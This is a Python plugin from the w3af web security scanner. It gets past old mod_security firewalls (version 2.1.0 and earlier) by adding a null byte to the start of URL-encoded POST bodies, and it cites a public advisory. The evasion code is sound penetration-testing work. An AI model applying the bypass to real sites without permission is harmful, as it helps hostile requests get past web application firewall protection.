'''
modsecurity.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.controllers.basePlugin.baseEvasionPlugin import baseEvasionPlugin
from core.controllers.w3afException import w3afException
import core.data.parsers.urlParser as urlParser

# options
from core.data.options.option import option
from core.data.options.optionList import optionList

import urllib2
import copy


class modsecurity(baseEvasionPlugin):
    '''
    Evade detection using a mod_security vulnerability.
    
    @author: Francisco Amato ( famato |at| infobyte.com.ar )
    '''

    def __init__(self):
        baseEvasionPlugin.__init__(self)

    def modifyRequest(self, request ):
        '''
        Mangles the request
        
        @parameter request: urllib2.Request instance that is going to be modified by the evasion plugin
        '''
        # Mangle the postdata
        data = request.get_data()
        if data:
            # Only mangle the postdata if it is a url encoded string
            try:
                urlParser.getQueryString('http://w3af/?' + data )
            except:
                pass
            else:
                data = '\x00' + data 
                headers_copy = copy.deepcopy(request.headers)
                headers_copy['content-length'] = str(len(data))
                
                request = urllib2.Request( request.get_full_url() , data, 
                                                    headers_copy, request.get_origin_req_host() )
                
        return request

    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''    
        ol = optionList()
        return ol

    def setOptions( self, OptionList ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter OptionList: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        pass
        
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''        
        return []

    def getPriority( self ):
        '''
        This function is called when sorting evasion plugins.
        Each evasion plugin should implement this.
        
        @return: An integer specifying the priority. 0 is runned first, 100 last.
        '''
        return 50
    
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This evasion plugin performs a bypass for mod_security version 2.1.0 or less here:
            - http://www.php-security.org/MOPB/BONUS-12-2007.html
        
        Important: The evasion only works for postdata.
        
        Example:
            Postdata Input:      'a=b'
            Postdata Output :    '\\x00a=b'
        '''
